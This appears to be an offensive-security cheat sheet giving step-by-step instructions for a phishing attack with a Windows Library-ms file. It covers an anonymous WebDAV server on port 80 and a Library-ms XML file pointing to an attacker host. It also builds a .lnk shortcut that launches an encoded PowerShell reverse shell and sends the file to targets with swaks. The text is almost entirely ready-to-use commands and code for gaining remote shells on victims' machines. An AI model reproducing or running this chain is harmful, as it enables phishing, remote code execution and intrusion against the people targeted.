# Config library ms phishing

Require webdav.


## 1. Setup webdav

use 80 port.

```bash
$ pip3 install wsgidav
$ mkdir ~/webdav
$ wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root ~/webdav
```

## 2. make `config.Library-ms` file

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>\\<LHOST_IP>\DavWWWRoot</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

`{7d49d726-3c21-4f05-99aa-fdc2c9474656}` is Documents GUID.

If you make in VIM, just `unix2dos config.Library-ms`.


## 3. (Windows) Add reverse shell .lnk shortcut

```powershell
$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("save.lnk")
$Shortcut.TargetPath = "C:\Windows\System32\cmd.exe"
$Shortcut.Arguments = "/c powershell.exe -ep bypass -enc xxx"
$Shortcut.Save()
```

## 3. (Linux) make a reverse shell

```
$ python3 -m pip install git+https://github.com/strayge/pylnk@dev
$ pylnk3 create 'C:\Windows\System32\cmd.exe' -a '/c powershell -e <Base64 RevShell>' good.lnk
```

## 4. finally

drop .lnk into webdav.

## 5. Sendmail
```
swaks -t target1@manesec.com -t target2@manesec.com --from mane@manesec.com --attach @config.Library-ms --server 192.168.XXX.XXX --body click --header "Subject: Sleep is good" -ap --auth-user xxxxxxxxxx  --auth-password 'xxxxxxxxxx'
```

```
swaks -t usera@manesec.com -t userb@manesec.com --from john@manesec.com --attach @config.Library-ms --server 192.168.XXX.XXX --body @body.txt --header "Subject: Staging Script" --suppress-data -ap
```


## Reference

+ https://pypi.org/project/pylnk3/

